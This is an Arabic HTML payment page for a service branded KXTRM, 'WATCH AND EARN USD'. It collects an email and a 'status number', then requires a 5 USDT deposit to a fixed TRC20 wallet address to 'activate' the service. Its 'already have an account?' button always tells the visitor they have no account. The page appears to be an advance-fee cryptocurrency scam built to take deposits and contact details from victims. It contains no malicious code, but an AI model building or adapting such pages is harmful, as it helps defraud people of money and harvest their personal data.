<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KXTRM - الدفع والاشتراك</title>
    
    <!-- جلب خط Cairo بالوزن الثقيل 900 لمحاكاة الخط الكوفي العريض للجميع -->
    <link rel="preconnect" href="https://googleapis.com">
    <link rel="preconnect" href="https://gstatic.com" crossorigin>
    <link href="https://googleapis.com/css2?family=Cairo:wght@900&display=swap" rel="stylesheet">

    <style>
        /* تطبيق الخط الكوفي العريض بشكل إجباري على كل عناصر الصفحة */
        * {
            font-family: 'Cairo', sans-serif !important;
            font-weight: 900 !important;
        }

        body { 
            background-color: #0f0c1b; 
            color: #ffffff; 
            text-align: center; 
            padding: 40px 20px; 
            margin: 0; 
        }
        .card { 
            background: linear-gradient(145deg, #1d1836, #130f24); 
            padding: 35px 25px; 
            border-radius: 20px; 
            display: inline-block; 
            width: 100%; 
            max-width: 380px; 
            box-shadow: 0 10px 25px rgba(0,0,0,0.5); 
            border: 1px solid #3d2f75; 
        }
        .brand { 
            font-size: 34px; 
            margin-bottom: 10px; 
            letter-spacing: 1px;
        }
        .subtitle { 
            color: #a29bfe; 
            font-size: 15px; 
            margin-bottom: 20px; 
        }
        .amount-tag {
            background-color: #1e1b4b;
            border: 1px dashed #6c5ce7;
            padding: 12px;
            border-radius: 10px;
            font-size: 18px;
            color: #00ffcc;
            margin-bottom: 25px;
        }
        .input-group { 
            margin-bottom: 20px; 
            text-align: right; 
        }
        label { 
            display: block; 
            margin-bottom: 8px; 
            color: #b2bec3; 
            font-size: 14px;
        }
        input[type="text"] { 
            width: 100%; 
            padding: 12px; 
            border-radius: 10px; 
            border: 1px solid #4a3f85; 
            background-color: #141026; 
            color: #fff; 
            box-sizing: border-box; 
            font-size: 15px; 
        }
        .footer-text { 
            margin-top: 25px; 
            font-size: 12px; 
            color: #636e72; 
        }
        
        /* تأثيرات الوميض والنبض للأزرار */
        @keyframes greenGlowPulse {
            0% { background-color: #00b894; box-shadow: 0 0 10px rgba(0, 184, 148, 0.5); }
            50% { background-color: #00ffa3; box-shadow: 0 0 25px rgba(0, 255, 163, 0.9); }
            100% { background-color: #00b894; box-shadow: 0 0 10px rgba(0, 184, 148, 0.5); }
        }

        @keyframes cyanGlowPulse {
            0% { background-color: #0097e6; box-shadow: 0 0 10px rgba(0, 151, 230, 0.5); }
            50% { background-color: #00d2ff; box-shadow: 0 0 25px rgba(0, 210, 255, 0.9); }
            100% { background-color: #0097e6; box-shadow: 0 0 10px rgba(0, 151, 230, 0.5); }
        }

        /* تنسيق زر المتابعة باللون الأخضر */
        .submit-btn-pulse {
            width: 100%; 
            padding: 14px; 
            color: #000000; 
            border: none; 
            border-radius: 8px; 
            font-size: 17px; 
            margin-top: 20px; 
            cursor: pointer;
            box-sizing: border-box;
            animation: greenGlowPulse 2s infinite ease-in-out;
            transition: 0.2s;
        }
        .submit-btn-pulse:hover { transform: scale(1.02); }

        /* تنسيق زر بايننس باللون الأخضر */
        .binance-btn-final {
            width: 100%; 
            padding: 15px; 
            color: #000000; 
            border: none; 
            border-radius: 10px; 
            font-size: 17px; 
            cursor: pointer; 
            display: block; 
            text-decoration: none; 
            margin-bottom: 15px;
            box-sizing: border-box;
            animation: greenGlowPulse 2s infinite ease-in-out;
            transition: 0.2s;
        }
        .binance-btn-final:hover { transform: scale(1.02); }

        /* حاوية الإيداع اليدوي باللون الأبيض الكامل وتنسيق نصوصها */
        .manual-deposit-box {
            margin-top: 25px; 
            padding: 18px 15px; 
            border: 2px dashed #0097e6; 
            border-radius: 12px; 
            background-color: #ffffff; 
            text-align: center;
            box-shadow: 0 5px 15px rgba(255,255,255,0.1);
        }

        /* حقل نص المحفظة داخل المربع الأبيض */
        .crypto-address-input {
            width: 100%; 
            padding: 11px; 
            text-align: center; 
            background: #f1f2f6; 
            color: #2f3542; 
            border: 1px solid #ced6e0; 
            border-radius: 6px; 
            font-size: 12px; 
            direction: ltr; 
            white-space: nowrap; 
            overflow: hidden; 
            text-overflow: ellipsis; 
            box-sizing: border-box;
        }

        /* زر نسخ عنوان المحفظة باللون السماوي النابض */
        .copy-btn-pulse {
            padding: 12px; 
            color: #ffffff; 
            border: none; 
            border-radius: 6px; 
            cursor: pointer; 
            font-size: 15px; 
            margin-top: 12px; 
            width: 100%;
            box-sizing: border-box;
            animation: cyanGlowPulse 2s infinite ease-in-out;
            transition: 0.2s;
        }
        .copy-btn-pulse:hover { transform: scale(1.02); }

        /* تنسيق زر التحقق من الحساب المسبق */
        .check-account-btn {
            width: 100%;
            padding: 12px;
            background: transparent;
            color: #a29bfe;
            border: 1px dashed #4a3f85; 
            border-radius: 8px;
            font-size: 14px;
            margin-top: 15px; 
            margin-bottom: 5px; 
            cursor: pointer;
            transition: 0.3s;
        }
        .check-account-btn:hover { background: #1d1836; color: #fff; border-color: #6c5ce7; }
    </style>
</head>
<body>
    <div class="card">
        <div class="brand">KXTRM</div>
        <div class="subtitle">إنشاء حساب جديد للمتابعة وتشغيل الخدمة</div>
        
        <div class="amount-tag">الإيداع: 5.00 USDT</div>

        <form id="paymentForm">
            <!-- الخطوة الأولى: بداية الدخول -->
            <div id="step1">
                <div class="input-group">
                    <label for="username">إنشاء حساب جديد</label>
                    <input type="text" id="username" required placeholder="example@gmail.com" style="background: #fff; color: #000; border: none; border-radius: 8px; margin-top: 8px; box-sizing: border-box;">
                </div>

                <!-- إضافة خيار حقل رقم الحالة الجديد تحت البريد الإلكتروني مباشرة -->
                <div class="input-group">
                    <label for="statusNumber">رقم الحالة</label>
                    <input type="text" id="statusNumber" required placeholder="أدخل رقم الحالة هنا" style="background: #fff; color: #000; border: none; border-radius: 8px; margin-top: 8px; box-sizing: border-box;">
                </div>

                <button type="button" onclick="goToStep2()" class="submit-btn-pulse">متابعة إلى الإيداع</button>
                <button type="button" onclick="alertNoAccount()" class="check-account-btn">هل لديك حساب مسبقاً؟</button>
            </div>

            <!-- الخطوة الثانية: خيارات الإيداع -->
            <div id="step2" style="display: none; margin-top: 15px;">
                <a href="https://binance.com" class="binance-btn-final">
                    ⚡ الدفع عبر بايننس طلب دفع
                </a>

                <div class="manual-deposit-box">
                    <p style="font-size: 14px; margin-bottom: 12px; color: #2f3542;">أو للإيداع من OKX وباقي المحافظ (شبكة TRC20):</p>
                    
                    <input type="text" value="THJN4XBKxbZNYsw7YAhmNiZSupn3KVEDFP" id="cryptoAddress" class="crypto-address-input" readonly>
                    
                    <button onclick="copyWalletAddress()" type="button" class="copy-btn-pulse">نسخ عنوان المحفظة</button>
                </div>
            </div>
        </form>

        <div class="footer-text">WATCH AND EARN USD</div>
    </div>

<script>
    function goToStep2() {
        const usernameInput = document.getElementById('username').value;
        const statusNumberInput = document.getElementById('statusNumber').value;
        
        // التحقق من تعبئة البريد الإلكتروني ورقم الحالة قبل الانتقال للخطوة الثانية
        if(usernameInput.trim() === "" || statusNumberInput.trim() === "") {
            alert("يرجى ملء جميع الحقول المطلوبة أولاً للمتابعة.");
            return;
        }
        document.getElementById('step1').style.display = 'none';
        document.getElementById('step2').style.display = 'block';
    }

    function copyWalletAddress() {
        const copyText = document.getElementById("cryptoAddress");
        navigator.clipboard.writeText(copyText.value.trim()).then(() => {
            alert("تم نسخ عنوان المحفظة بشكل سليم! قم بالتحويل من OKX أو أي محفظة أخرى على شبكة TRC20 بقيمة 5 USDT.");
        }).catch(err => {
            copyText.select();
            copyText.setSelectionRange(0, 99999);
            document.execCommand("copy");
            alert("تم نسخ عنوان المحفظة!");
        });
    }

    function alertNoAccount() {
        alert("أنت لا تمتلك حساباً مسبقاً، يرجى كتابة البيانات المطلوبة وإتمام الإيداع لتفعيل الخدمة.");
    }
</script>
</body>
</html>
